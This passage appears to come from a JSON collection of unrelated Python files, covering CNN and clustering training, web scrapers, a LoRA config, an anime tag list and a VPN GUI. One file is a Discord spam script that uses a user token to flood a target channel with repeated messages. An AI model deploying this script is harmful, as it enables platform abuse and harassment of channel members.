axis=0)\n    \n    # one-hot \u7f16\u7801\n    labels = 7\n    Y_train = to_categorical(Y_train, num_classes=labels)\n    Y_test = to_categorical(Y_test, num_classes=labels)\n    \n    # \u6570\u636ereshape\n    width, height = 48, 48\n    X_train = X_train.reshape(X_train.shape[0], width, height, 1)\n    X_test = X_test.reshape(X_test.shape[0], width, height, 1)\n    \n    return X_train, Y_train, X_test, Y_test\n\ndef build_model(input_shape, num_classes):\n    model = Sequential()\n    model.add(Conv2D(64, kernel_size=(3, 3), activation='relu', input_shape=input_shape))\n    model.add(Conv2D(64, kernel_size=(3, 3), activation='relu'))\n    model.add(MaxPooling2D(pool_size=(2, 2), strides=(2, 2)))\n    model.add(Dropout(0.5))\n    model.add(Conv2D(64, kernel_size=(3, 3), activation='relu'))\n    model.add(Conv2D(64, kernel_size=(3, 3), activation='relu'))\n    model.add(MaxPooling2D(pool_size=(2, 2), strides=(2, 2)))\n    model.add(Dropout(0.5))\n    model.add(Conv2D(128, kernel_size=(3, 3), activation='relu'))\n    model.add(Conv2D(128, kernel_size=(3, 3), activation='relu'))\n    model.add(MaxPooling2D(pool_size=(2, 2), strides=(2, 2)))\n    model.add(Flatten())\n    model.add(Dense(512, activation='relu'))\n    model.add(Dropout(0.2))\n    model.add(Dense(num_classes, activation='softmax'))\n    return model\n\ndef train_model(model, X_train, Y_train, X_test, Y_test, batch_size=64, epochs=1):\n    model.compile(loss=categorical_crossentropy, optimizer=Adam(), metrics=['accuracy'])\n    model.fit(X_train, Y_train, batch_size=batch_size, epochs=epochs, verbose=1, validation_data=(X_test, Y_test), shuffle=True)\n\ndef save_model(model, model_file, weights_file):\n    model_json = model.to_json()\n    with open(model_file, 'w') as json_file:\n        json_file.write(model_json)\n    model.save_weights(weights_file)\n\n# \u52a0\u8f7d\u548c\u9884\u5904\u7406\u6570\u636e\nX_train, Y_train, X_test, Y_test = load_and_preprocess_data('fer2013.csv')\n\n# \u6784\u5efa\u6a21\u578b\ninput_shape = X_train.shape[1:]\nnum_classes = 7\nmodel = build_model(input_shape, num_classes)\n\n# \u8bad\u7ec3\u6a21\u578b\ntrain_model(model, X_train, Y_train, X_test, Y_test)\n\n# \u4fdd\u5b58\u6a21\u578b\nsave_model(model, 'fer-1.json', 'fer-1.h5')\n",
    "import requests\nimport json\nimport math\nfrom bs4 import BeautifulSoup\n\ndef main():\n    with open(\"cuisines.json\", \"r\", encoding=\"utf-8\") as cuisines_file, open(\"dishes.json\", \"r+\", encoding=\"utf-8\") as dishes_file:\n        cuisines = json.load(cuisines_file)\n        dishes = json.load(dishes_file)\n\n        for cuisine in cuisines:\n            cuisine_type = cuisine[\"name\"].strip(\"-\")\n            num_pages = math.ceil(cuisine[\"dishes_count\"] / 20)\n            if num_pages == 0:\n                continue\n\n            url = cuisine[\"uri\"]\n            url = url.split(\"/\")\n            url[-3] = \"cuisinedishes\"\n            url = \"/\".join(url)\n\n            for page_num in range(1, num_pages+1):\n                response = requests.get(f\"{url}{page_num}\")\n\n                soup = BeautifulSoup(response.content, \"html.parser\")\n\n                elements = soup.find_all(class_=\"title3 color2\")\n                for element in elements:\n                    link_text = element.find(\"a\").text\n\n                    if link_text in dishes:\n                        dishes[link_text][\"cuisine_type\"] = cuisine_type\n\n    with open(\"dishes.json\", \"w\", encoding=\"utf-8\") as dishes_file:\n        json.dump(dishes, dishes_file, indent=4)\n\nif __name__ == \"__main__\":\n    main()",
    "import json\n\nimport requests\nfrom bs4 import BeautifulSoup\nfrom sqlalchemy.sql.functions import now\n\nimport cache\nfrom db import News\nfrom .crawler import Crawler\n\n\nclass TieBaCrawler(Crawler):\n\n    def fetch(self):\n        url = \"https://tieba.baidu.com/hottopic/browse/topicList\"\n\n        resp = requests.get(url=url, params=self.header, verify=False, timeout=self.timeout)\n        if resp.status_code != 200:\n            print(f\"\u8bf7\u6c42\u5931\u8d25\uff0c\u72b6\u6001\u7801\uff1a{resp.status_code}\")\n            return []\n\n        json_data = resp.json()\n        hot_discuses = json_data.get(\"data\")[\"bang_topic\"][\"topic_list\"]\n        result = []\n        cache_list = []\n        for i, discus in enumerate(hot_discuses):\n            title = discus.get(\"topic_name\")\n            score = discus.get(\"discuss_num\")\n            desc = discus.get(\"topic_desc\")\n            link = discus.get(\"topic_url\")\n\n            news = News(title=title, url=link, score=score, desc=desc, source=self.crawler_name(), create_time=now(), update_time=now())\n            result.append(news)\n            cache_list.append(news.to_cache_json())\n\n        cache._hset(self.date_str, self.crawler_name(), json.dumps(cache_list, ensure_ascii=False))\n        return result\n\n    def crawler_name(self):\n        return \"tieba\"\n\n",
    "from django.shortcuts import render\nfrom rectpatchantennapp.forms import OptimizerForm\nimport joblib\n# Create your views here.\n\n\ndef RandomForest(request): \n    if request.method == \"POST\":\n        optimizer = OptimizerForm(request.POST)\n        if optimizer.is_valid():\n            optimizer.save()\n            model = joblib.load(\"./rectangular_patch_antenna.pkl\")\n            col_names = joblib.load(\"./rpa_col_names.pkl\")\n            prediction =model.predict([[optimizer.cleaned_data.get(\"frequency\"),\n                                       optimizer.cleaned_data.get(\"length_of_patch\"),\n                                       optimizer.cleaned_data.get(\"width_of_patch\"),\n                                       optimizer.cleaned_data.get(\"slot_length\"),\n                                       optimizer.cleaned_data.get(\"slot_width\")]])\n            \n\n            return render(request, \"rectpatchantennapp/Optimizer.html\", {\"form\": optimizer, \"prediction\": round(prediction[0], ndigits=4)})\n    else:\n        optimizer = OptimizerForm()\n        return render(request, \"rectpatchantennapp/Optimizer.html\", {\"form\": optimizer})",
    "# This file is a part of m-LoRA (mlora/common/modelargs.py)\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# Copyright (C) 2023-2024 All Rights Reserved.\n#\n# Github:  https://github.com/scukdde-llm/mlora\n\nraise AttributeError(\"This file is a part of m-LoRA (mlora/common/modelargs.py). Do not run it separately.\")\n\nfrom typing import Any, List, Dict, Callable\nfrom transformers.activations import ACT2FN\nfrom mlora.backends import get_backend\n\nfrom dataclasses import dataclass\n\nimport torch\nimport copy\n\n\nTokens = List[int]\nLabels = List[Any]\nMasks = List[bool]\n\n\n@dataclass\nclass DataClass:\n    tokens_: Tokens = None\n    labels_: Labels = None\n\n\n@dataclass\nclass TokenizerArgs:\n    vocab_size_: int = -1\n    bos_id_: int = -1\n    eos_id_: int = -1\n    pad_id_: int = -1\n\n\n@dataclass\nclass LLMModelArgs:\n    name_or_path_: str = \"\"\n    device_: str = \"\"\n    dim_: int = 4096\n    multiple_of_: int = 256\n    n_heads_: int = 32\n    n_kv_heads_: int = 32\n    n_layers_: int = 32\n    hidden_act_: str = \"silu\"\n    hidden_dropout_: float = 0.0\n    vocab_size_: int = -1\n    pad_token_id_: int = -1\n    rope_theta_: float = 10000.0\n    max_seq_len_: int = 2048\n    # eager, xformers, flash_attn\n    attn_implementation_: str = \"eager\"\n    # data type\n    dtype_: torch.dtype = None\n\n\n@dataclass\nclass LLMModelOutput:\n    adapter_name: str = None\n    logits: torch.Tensor = None\n    loss: torch.Tensor = None\n    aux_loss: torch.Tensor = None\n    # for internal use\n    batch_start_idx_: int = -1\n    batch_end_idx_: int = -1\n    loss_fn_: Callable = None\n\n\n@dataclass\nclass LoraBatchDataConfig:\n    adapter_name_: str = \"\"\n    batch_start_idx_: int = -1\n    batch_end_idx_: int = -1\n\n\n@dataclass\nclass MultiLoraBatchData:\n    lora_batch_data_config_: List[LoraBatchDataConfig] = None\n\n    batch_tokens_: List[Tokens] = None\n    attention_masks_: List[Tokens] = None\n\n    gradient_checkpoint_: bool = True\n    inference_seq_pos_: int = -1\n\n    @property\n    def inference_mode_(self) -> bool:\n        return self.inference_seq_pos_ >= 0\n\n\n@dataclass\nclass LoraConfig:\n    adapter_name: str = \"\"\n    task_name: str = \"casual\"\n    device: str = f\"{get_backend().device_name()}:0\"\n    # Weight-Decomposed Low-Rank Adaptation\n    use_dora_: bool = False\n    # Rank-Stabilized LoRA\n    # sets the adapter scaling factor to `alpha/math.sqrt(r)`\n    use_rslora_: bool = False\n    # can be original or gaussian\n    lora_init_: str = \"original\"\n    lora_r_: int = None\n    lora_alpha_: int = None\n    lora_dropout_: float = None\n    target_modules_: Dict[str, bool] = None\n\n    def check(self) -> \"LoraConfig\":\n        assert isinstance(self.use_dora_, bool)\n        assert isinstance(self.use_rslora_, bool)\n        assert isinstance(self.lora_init_, str) and self.lora_init_ in [\n            \"original\", \"gaussian\"]\n        assert isinstance(self.lora_r_, int) and self.lora_r_ > 0\n        assert isinstance(self.lora_alpha_, int) and self.lora_alpha_ > 0\n        assert isinstance(self.lora_dropout_,\n                          float) and self.lora_dropout_ >= 0\n        assert isinstance(self.target_modules_, Dict)\n        for key, value in self.target_modules_.items():\n            assert isinstance(key, str) and len(key) > 0\n            assert isinstance(value, bool)\n\n        return self\n\n    def from_config(self, config: Dict[str, any]) -> \"LoraConfig\":\n        self.use_dora_ = config.get(\"use_dora\", False)\n        self.use_rslora_ = config.get(\"use_rslora\", False)\n        self.lora_init_ = config.get(\"lora_init\", \"original\")\n        self.lora_r_ = config[\"r\"]\n        self.lora_alpha_ = config[\"lora_alpha\"]\n        self.lora_dropout_ = config[\"lora_dropout\"]\n        self.target_modules_ = {\n            # LLaMA names\n            \"q_proj\": False,\n            \"k_proj\": False,\n            \"v_proj\": False,\n            \"o_proj\": False,\n            \"w1_proj\": False,\n            \"w2_proj\": False,\n            \"w3_proj\": False,\n            # Phi names\n            \"dense\": False,\n            \"fc1\": False,\n            \"fc2\": False,\n        }\n        if isinstance(config[\"target_modules\"], List):\n            for target in config[\"target_modules\"]:\n                if target in self.target_modules_:\n                    self.target_modules_[target] = True\n        elif isinstance(config[\"target_modules\"], Dict):\n            for target, value in config[\"target_modules\"].items():\n                if target in self.target_modules_:\n                    self.target_modules_[target] = value\n        else:",
    "from ._supermodel import SuperModel\nfrom ._tooluser import ToolUser, ToolUserNoStream\nfrom ._agent import Agent\nfrom ._base import ModelType\n\ndef notimplemented(model_type):\n    from tkinter import messagebox\n    return messagebox.showinfo(\"Not implemented\", f\"{model_type.capitalize()} hasn't been implemented yet, sorry. Falling back on dze French SuperModel: Mixtral.\")\n\ndef dispatcher(model_name:str, model_type:ModelType) -> SuperModel | ToolUserNoStream | ToolUser | Agent: \n    \"\"\"\n    Choose the model name and type.\n    :param model_name: The name, Supermodel, Tooluser, or Agent.\n    :param model_type: The type of LLM, GPT-4-Turbo, LLaMA or Mixtral.\n    :return: a model.\n    \"\"\"\n    try:\n        if \"SuperModel\" in model_name:            \n            if \"llama2\" in model_type:                \n                llm = SuperModel(\"llama2-70b-4096\")                \n            elif \"gemma\" in model_type:\n                llm = SuperModel(\"gemma-7b-it\")\n            elif \"gpt4\" in model_type:\n                llm = SuperModel(\"gpt-4-turbo-preview\")\n            elif \"gpt3\" in model_type:\n                llm = SuperModel(\"gpt-3.5-turbo\") \n            elif \"mixtral\" in model_type or model_type is None:\n                llm = SuperModel(\"mixtral-8x7b-32768\") \n            else: \n                notimplemented(model_type)\n                    \n        if \"ToolUser\" in model_name:  \n            if \"llama2\" in model_type:\n                llm = ToolUserNoStream(\"llama2-70b-4096\")                \n            elif \"gemma\" in model_type:\n                llm = ToolUserNoStream(\"gemma-7b-it\")\n            elif \"gpt4\" in model_type:\n                llm = ToolUser(\"gpt-4-turbo-preview\")\n            elif \"gpt3\" in model_type:\n                llm = ToolUser(\"gpt-3.5-turbo\")\n            elif \"mixtral\" in model_type or model_type is None:\n                llm = ToolUserNoStream(\"mixtral-8x7b-32768\") \n            else: \n                notimplemented(model_type)\n            \n        if \"Agent\" in model_name:\n            if \"llama2\" in model_type:\n                llm = Agent(model_name_1=\"llama2-70b-4096\")                \n            elif \"gemma\" in model_type:\n                llm = Agent(model_name_1=\"gemma-7b-it\")\n            elif \"gpt4\" in model_type:\n                llm = Agent(model_name_1=\"gpt-4-turbo-preview\")\n            elif \"gpt3\" in model_type:\n                llm = Agent(model_name_1=\"gpt-3.5-turbo\")\n            elif \"mixtral\" in model_type or model_type is None:\n                llm = Agent(model_name_1=\"mixtral-8x7b-32768\") \n            else: \n                notimplemented(model_type)\n                \n        return llm\n    \n    except IndexError as e:\n        raise Exception(\"the model name should come in two parts.\", e) \n\n# from dotenv import load_dotenv\n# import os, sys\n\n# cwd = os.getcwd()\n# if cwd.endswith(\"electron_groq\"):            \n#     env_path=os.path.join(cwd, \"python\", \".env\")\n# else: \n#     env_path=os.path.join(cwd, \"resources\", \"python\", \".env\")\n\n# load_dotenv(env_path)",
    "PICKED_TAGS = [\n    'little_red_riding_hood_(grimm)',\n    'maria_cadenzavna_eve',\n    'nakano_itsuki',\n    'shameimaru_aya',\n    'kicchou_yachie',\n    'dido_(azur_lane)',\n    'hina_(dress)_(blue_archive)',\n    'warspite_(kancolle)',\n    'kallen_kaslana',\n    'marill',\n    'shiraishi_tsumugi',\n    'otonashi_yuzuru',\n    'judgement_(helltaker)',\n    'yuzuhara_konomi',\n    'mash_kyrielight',\n    'tsujino_akari',\n    'el_condor_pasa_(umamusume)',\n    'nilou_(genshin_impact)',\n    'moroboshi_kirari',\n    'sheik',\n    'huang_baoling',\n    'astesia_(arknights)',\n    'hoto_cocoa',\n    \"jeanne_d'arc_(swimsuit_archer)_(first_ascension)_(fate)\",\n    'honma_himawari',\n    'flareon',\n    'bache_(azur_lane)',\n    'kayoko_(blue_archive)',\n    'houlen_yabusame',\n    'oboro_(kancolle)',\n    \"lana's_mother_(pokemon)\",\n    'hakurei_reimu_(pc-98)',\n    'shouhou_(kancolle)',\n    'yamada_ryo',\n    'xenovia_quarta',\n    'eren_yeager',\n    'noshiro_(kancolle)',\n    'barnaby_brooks_jr.',\n    'matsukaze_(kancolle)',\n    \"tokarev_(girls'_frontline)\",\n    'nakamura_yuri',\n    'yoshikawa_yuuko',\n    'anya_(spy_x_family)',\n    'hirasawa_yui',\n    'tomimi_(arknights)',\n    'yamagou_ayumi',\n    'felicia_(vampire)',\n    'kizuna_akari',\n    'lusamine_(pokemon)',\n    'tsuruya',\n    'seaport_princess',\n    'hoshimiya_ichigo',\n    'kaname_buccaneer',\n    'ironmouse',\n    'kuwayama_chiyuki',\n    'oberon_(fate)',\n    'suzutsuki_(kancolle)',\n    'widowmaker_(overwatch)',\n    'kuroka_(high_school_dxd)',\n    'asahina_mafuyu',\n    'takasaki_yu',\n    'charizard',\n    'vampire_(azur_lane)',\n    'pecorine_(princess_connect!)',\n    'jervis_(kancolle)',\n    'kinugasa_kai_ni_(kancolle)',\n    'zima_(arknights)',\n    'golden_snub-nosed_monkey_(kemono_friends)',\n    'wriothesley_(genshin_impact)',\n    'jintsuu_(kancolle)',\n    'murasame_(kancolle)',\n    'kaga_(azur_lane)',\n    'yagami_taichi',\n    'i-14_(kancolle)',\n    'noumi_kudryavka',\n    'soga_no_tojiko',\n    'hanako_(swimsuit)_(blue_archive)',\n    'nishi_kinuyo',\n    'kujikawa_rise',\n    'mizuho_(kancolle)',\n    'ishtar_(fate)',\n    'tohsaka_tokiomi',\n    'nina_(fire_emblem)',\n    'uchiha_sarada',\n    'vira_(granblue_fantasy)',\n    'hakurei_reimu',\n    'atago_(azur_lane)',\n    'isshiki_akane',\n    'griffith_(berserk)',\n    'soldier:_76_(overwatch)',\n    'ram_(re:zero)',\n    'cure_lovely',\n    'uraraka_ochako',\n    'justice_(helltaker)',\n    'airfield_princess',\n    'beatrix_(granblue_fantasy)',\n    'oikawa_shizuku',\n    'shiraishi_an',\n    'mia_(fire_emblem)',\n    'tsurumaru_kuninaga',\n    'shirabe_ako',\n    'cure_rosetta',\n    'protagonist_3_(housamo)',\n    'yami_yuugi',\n    'common_raccoon_(kemono_friends)',\n    'todo_yurika',\n    'kurapika',\n    'sakura_chiyo',\n    'yukihana_lamy_(1st_costume)',\n    'cu_chulainn_(fate/stay_night)',\n    'alisa_(girls_und_panzer)',\n    'hanekawa_tsubasa',\n    'katagiri_sanae',\n    'bianca_(pokemon)',\n    'rinoa_heartilly',\n    'misaka_mikoto',\n    'teireida_mai',\n    'vivlos_(umamusume)',\n    'meer_campbell',\n    'lyria_(granblue_fantasy)',\n    \"kal'tsit_(arknights)\",\n    'anastasia_(fate)',\n    'hummy_(suite_precure)',\n    'jude_mathis',\n    'aegir_(azur_lane)',\n    'kureiji_ollie',\n    'agnes_tachyon_(umamusume)',\n    'katsura_hinagiku',\n    'azki_(hololive)',\n    'okada_izou_(fate)',\n    'tsukino_mito_(1st_costume)',\n    'yin_(darker_than_black)',\n    'velvet_crowe',\n    'circe_(fate)',\n    'hibiki_(cheer_squad)_(blue_archive)',\n    'conte_di_cavour_(kancolle)',\n    'miyako_(swimsuit)_(blue_archive)',\n    'bb_(fate/extra)',\n    'rena_erindel',\n    'tony_stark',\n    'hatsuharu_(kancolle)',\n    'klee_(genshin_impact)',\n    'akagi_(azur_lane)',\n    'hiryuu_(kancolle)',\n    'hanzo_(overwatch)',\n    'leo_(fire_emblem)',\n    'belarus_(hetalia)',\n    'mysterious_heroine_x_(fate)',\n    'eva_02',\n    'fu_hua',\n    'mythra_(xenoblade)',\n    'nonohara_yuzuko',\n    'houshou_(kancolle)',\n    'ikuno_dictus_(umamusume)',\n    'izayoi_sakuya',\n    'cure_melody',\n    'sf-a2_miki',\n    'kijin_seija',\n    'futaba_anzu',\n    'sanageyama_uzu',\n    'akane_(bunny)_(blue_archive)',\n    'haman_karn',\n    'sendai_hakurei_no_miko',\n    'dawn_(pokemon)',\n    'miyashita_ai',\n    'yonaga_angie',\n    'nekomata_okayu_(3rd_costume)',\n    'tatsuta_(kancolle)',\n    'himekaidou_hatate',\n    'keith_goodman',\n    'bismarck_(kancolle)',\n    'yami_yugi',\n    'torchic',\n    'yusa_kozue',\n    'courtney_(pokemon)',\n    'koharu_(swimsuit)_(blue_archive)',\n    'gran_(granblue_fantasy)',\n    'rita_mordio',\n    'asashio_kai_ni_(kancolle)',\n    'frieren',\n    'akatsuki_(kancolle)',\n    'uranami_(kancolle)',\n    'shinonome_ena',\n    'namazuo_toushirou',\n    'natsume_rin',\n    'milla_maxwell',\n    'kirima_syaro',\n    'pepperoni_(girls_und_panzer)',\n    'akiyama_mio',\n    'artoria_caster_(fate)',\n    'inazuma_(kancolle)',\n    \"jack-o'_valentine\",\n    'mizuhashi_parsee',\n    'azusawa_kohane',\n    'dead_master',\n    'oda_nobunaga_(swimsuit_berserker)_(fate)',\n    'maru-yu_(kancolle)',\n    'yuki_miku',\n    'naka_(kanco",
    "import torch\r\nimport utils\r\nimport torch.nn.functional as F\r\nimport numpy as np\r\nimport random\r\nimport torch.nn as nn\r\nimport warnings\r\nimport math\r\nimport time\r\nfrom model import DCGL\r\nfrom torch.optim import Adam\r\nfrom evaluation import eva\r\n\r\n\r\ndef setup_seed(seed):\r\n    torch.manual_seed(seed)\r\n    torch.cuda.manual_seed_all(seed)\r\n    np.random.seed(seed)\r\n    random.seed(seed)\r\n    torch.backends.cudnn.deterministic = True\r\n\r\n\r\ndef train(args):\r\n    setup_seed(args.seed)\r\n    warnings.filterwarnings('ignore')\r\n    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\r\n    print(device)\r\n    # Data process\r\n    [X, Y] = utils.load_data(args.name)\r\n    args.samples = X.shape[0]\r\n    args.input_dim = X.shape[1]\r\n    args.n_clusters = len(np.unique(Y))\r\n    args.upperNei = math.floor(args.samples / args.n_clusters)\r\n    X = F.normalize(X, p=2, dim=1).to(device)\r\n\r\n    nei = args.neighbor\r\n    A, _ = utils.build_LPG(X.T, nei)\r\n    A = utils.graph_normalize(A).to(device)\r\n\r\n    curModel = DCGL(num_features=args.input_dim,\r\n                    hidden_size=args.hidden_size,\r\n                    emblem_size=args.emblem_size,\r\n                    n_clusters=args.n_clusters).to(device)\r\n    print(curModel)\r\n    print(\r\n        f'Samples: {X.shape[0]}, Dimensions: {args.input_dim}, Clusters: {args.n_clusters}'\r\n    )\r\n    print(\"---------------------\")\r\n\r\n    optimizer = Adam(curModel.parameters(),\r\n                     lr=args.lr,\r\n                     weight_decay=args.weight_decay)\r\n\r\n    MSE = nn.MSELoss()\r\n    retScore = [0, 0, 0, 0]\r\n    # Start train\r\n    start_time = time.time()\r\n    for epoch in range(args.max_epoch):\r\n        curModel.train()\r\n        S_L, h1, h2, X_rec, km, z1, z2 = curModel(X, A, args.n_clusters, nei,\r\n                                                  args.upperNei)\r\n\r\n        l1 = MSE(X, X_rec)\r\n\r\n        label = torch.LongTensor(km.labels_).to(device)\r\n        centers = torch.FloatTensor(km.cluster_centers_).to(device)\r\n        l2 = utils.FL_Loss(args.n_clusters, h1, centers, label, h2)\r\n\r\n        l3 = utils.GL_Loss(S_L, h1)\r\n\r\n        l4 = utils.CL_Loss(z1, z2, h1)\r\n\r\n        loss = l1 + l2 + args.lambda1 * l3 + args.lambda2 * l4\r\n\r\n        optimizer.zero_grad()\r\n        loss.backward()\r\n        optimizer.step()\r\n\r\n        with torch.no_grad():\r\n            S_L, h1, _, _, _, _, _ = curModel(X,\r\n                                              A,\r\n                                              args.n_clusters,\r\n                                              nei=nei,\r\n                                              upper_nei=args.upperNei)\r\n\r\n            label = utils.spectral_clustering(S_L.cpu().numpy(),\r\n                                              args.n_clusters,\r\n                                              NCut=True).labels_\r\n            acc, nmi, ari, f1 = eva(Y, label)\r\n            print(\r\n                f'epoch {epoch}:acc {acc:.4f}, nmi {nmi:.4f}, ari {ari:.4f}, f1 {f1:.4f}'\r\n            )\r\n            retScore[0] = max(retScore[0], acc)\r\n            retScore[1] = max(retScore[1], nmi)\r\n            retScore[2] = max(retScore[2], ari)\r\n            retScore[3] = max(retScore[3], f1)\r\n\r\n            if (epoch + 1) % args.update_interval == 0:\r\n                if nei >= args.upperNei:\r\n                    break\r\n                else:\r\n                    nei += args.neighbor\r\n            \r\n    end_time = time.time()\r\n    running_time = end_time - start_time\r\n\r\n    print(\"---------------------\")\r\n    print(\r\n        f'final acc: {acc:.4f}, nmi: {nmi:.4f}, ari: {ari:.4f}, f1: {f1:.4f}')\r\n    print(\r\n        f'best  acc: {retScore[0]:.4f}, nmi: {retScore[1]:.4f}, ari: {retScore[2]:.4f}, f1: {retScore[3]:.4f}'\r\n    )\r\n    print(f'Running time: {running_time} \u79d2')\r\n",
    "import requests,random,time,json\nfrom random import *\n\ntry:\n    with open (\"config.json\", 'r') as f:\n        setup = json.load(f)\n        token, cooldown, Cid = setup['TOKEN'], setup['COOLDOWN'], setup['CHANNEL_ID']\nexcept:\n    print(\"[Error] Json file not found. Try unzipping this file or downloading the config file\")\n\nif not token:\n    token = input(\"[!] Discord Token?: \")\ntry:\n    if not Cid:\n        Cid = input(\"[!] Target Channel Id?: \")\n    e = int(Cid)\n    Cid = str(Cid)\n    spam_times = input(\"[!] How Many Time Will The Message Be Sent?: \")\n    spam_times = int(spam_times)\n    if not cooldown:\n        cooldown = input(\"[!] Cooldown between message?: \")\n    try:\n        cooldown = int(cooldown)\n    except:\n        cooldown = float(cooldown)\nexcept:\n    print(\"[Error] Please input the right things or check the config file\")\n    exit()\nmessage = input(\"[!] Message Content?: \")\n\nglobal_headers = {\n    'authorization' : token,\n    'authority': 'discord.com',\n    'accept': '*/*',\n    'accept-language': 'sv,sv-SE;q=0.9',\n    'content-type': 'application/json',\n    'origin': 'https://discord.com',\n    'referer': 'https://discord.com/',\n    'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"',\n    'sec-ch-ua-mobile': '?0',\n    'sec-ch-ua-platform': '\"Windows\"',\n    'sec-fetch-dest': 'empty',\n    'sec-fetch-mode': 'cors',\n    'sec-fetch-site': 'same-origin',\n    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',\n    'x-debug-options': 'bugReporterEnabled',\n    'x-discord-locale': 'sv-SE',\n    'x-discord-timezone': 'Europe/Stockholm',\n}    \nerror_exit = 0\n\nfor i in(range(int(spam_times))): \n    payload ={\n    \"content\": message,\n    \"nonce\": randint(1, 100000),\n    \"tts\": False\n    }\n    r = requests.request(\"POST\", f\"https://discord.com/api/v9/channels/{Cid}/messages\", json = payload, headers = global_headers)\n    if r.status_code == 200:\n        print(f\"[Sucess] Message Sent in {Cid}\")\n    elif r.status_code == 401:\n        print(\"[Error] Your token might be invalid! Please check it\")\n        exit()\n    elif r.status_code == 403:\n        print(\"[Error] You might have been kicked out of the guild the token was previously sending message in, retrying...\")\n        error_exit +1\n        if error_exit == 5:\n            print(\"[Error] Exiting due to token being kicked from the guide\")\n            exit()\n    elif r.status_code == 429:\n        print(\"[Error] Spamming messages to fast! retrying...\")\n    else:\n        zzz = r.json()\n        print(f\"[Error] Error while performing, error staus code: {r.status_code}, here is the error: {zzz}\")\n        error_exit + 1\n        if error_exit == 5:\n            print(\"[Error] Too many errors while requests, exiting.\")\n            exit()\n    time.sleep(cooldown)\nprint(\"[Sucess] Finished Sending messages, exiting\")\nexit()\n",
    "#Powered By feelded.t.me\r\n\r\nimport os\r\nimport sys\r\nimport re\r\nimport time\r\nimport json\r\nimport winreg\r\nimport atexit\r\nfrom PyQt5.QtCore import QThread, Qt\r\nfrom PyQt5.QtGui import QIcon, QPalette, QColor\r\nfrom PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QVBoxLayout, QCheckBox, QLineEdit, QListWidget, QListWidgetItem, QLabel, QSpinBox, QAbstractSpinBox, QGroupBox, QGridLayout, QVBoxLayout\r\n\r\n#System Configs\r\nclass Config(object):\r\n    VERSION_NUMBER = 'v1.0'\r\n    DRAFT = 'false'  # Lowercase [true, false]\r\n    PRE_RELEASE = 'false'  # Lowercase [true, false], !! Tag name must contain only pre released builds\r\n    OS = 'Windows-x64' # Idk whats yours !?\r\n    COPYRIGHT = 2024\r\n    CREDIT = 'feelded.t.me'\r\n\r\n#Get file path\r\ndef GetPath(pathex):\r\n    if hasattr(sys, '_MEIPASS'):\r\n        return str(os.path.join(sys._MEIPASS, pathex)).replace('\\\\', '/')\r\n    return str(os.path.join(os.path.abspath(\".\"), pathex)).replace('\\\\', '/')\r\n\r\n#Set Proxy\r\ndef SetProxy(proxy_host, proxy_port):\r\n    try:\r\n        internet_settings_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings', 0, winreg.KEY_WRITE)\r\n        winreg.SetValueEx(internet_settings_key, 'ProxyEnable', 0, winreg.REG_DWORD, 1)\r\n        winreg.SetValueEx(internet_settings_key, 'ProxyServer', 0, winreg.REG_SZ, f'socks={proxy_host}:{proxy_port}')\r\n        winreg.CloseKey(internet_settings_key)\r\n        print(\"SOCKS5 proxy set successfully.\")\r\n    except Exception as e:\r\n        print(f\"Error setting SOCKS5 proxy: {e}\")\r\n\r\n#Unset Proxy\r\ndef UnsetProxy():\r\n    try:\r\n        internet_settings_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings', 0, winreg.KEY_WRITE)\r\n        winreg.SetValueEx(internet_settings_key, 'ProxyEnable', 0, winreg.REG_DWORD, 0)\r\n        winreg.CloseKey(internet_settings_key)\r\n        print(\"SOCKS5 proxy unset successfully.\")\r\n    except Exception as e:\r\n        print(f\"Error unsetting SOCKS5 proxy: {e}\")\r\n\r\n\r\n#Shut the proxy on exit\r\ndef OnExit(): UnsetProxy(); os.system('taskkill /F /IM VoxCore.exe'); return print('Bye:)')\r\n\r\n\r\n#VPN CLASS\r\nclass VPNApp(QWidget):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.initUI()\r\n        atexit.register(OnExit)\r\n\r\n    def initUI(self):\r\n        print('VOX LOGS - FREEDOM')\r\n        self.setWindowTitle('Vox VPN')\r\n\r\n        layout = QVBoxLayout()\r\n\r\n        self.setFixedWidth(500)\r\n        self.setFixedHeight(400)\r\n\r\n        icon = QIcon(GetPath('media/vpn.png'))\r\n        self.setWindowIcon(icon)\r\n        \r\n        palette = self.palette()\r\n        palette.setColor(QPalette.Window, QColor(0, 0, 0))\r\n        self.setPalette(palette)\r\n\r\n        self.worker_thread = QThread()\r\n\r\n        self.connect_button = QPushButton('Connect', self)\r\n        self.connect_button.clicked.connect(self.connect_clicked)\r\n        self.connect_button.setStyleSheet(\"QPushButton:pressed {background-color: rgb(30, 30, 30);border: 2px solid white;}QPushButton {background-color: #111;border-radius: 8px;color: white;height: 30%;} QPushButton:disabled {color: #4caf50;background-color: rgb(30, 30, 30)}\")\r\n        layout.addWidget(self.connect_button)\r\n\r\n        self.disconnect_button = QPushButton('Disconnect', self)\r\n        self.disconnect_button.clicked.connect(self.disconnect_clicked)\r\n        self.disconnect_button.setStyleSheet(\"QPushButton:pressed {background-color: rgb(30, 30, 30);border: 2px solid white;}QPushButton {background-color: #111;border-radius: 8px;color: white;height: 30%;} QPushButton:disabled {color: #f44336;background-color: rgb(30, 30, 30)}\")\r\n        layout.addWidget(self.disconnect_button)\r\n\r\n        self.cfon_checkbox = QCheckBox('CFON Mode', self)\r\n        self.cfon_checkbox.setStyleSheet(\"QCheckBox {color: white;text-align: center;}QCheckBox::indicator {width: 20px;height: 20px;}QCheckBox::indicator:checked {image: url({CHECK});}QCheckBox::indicator:unchecked {image: 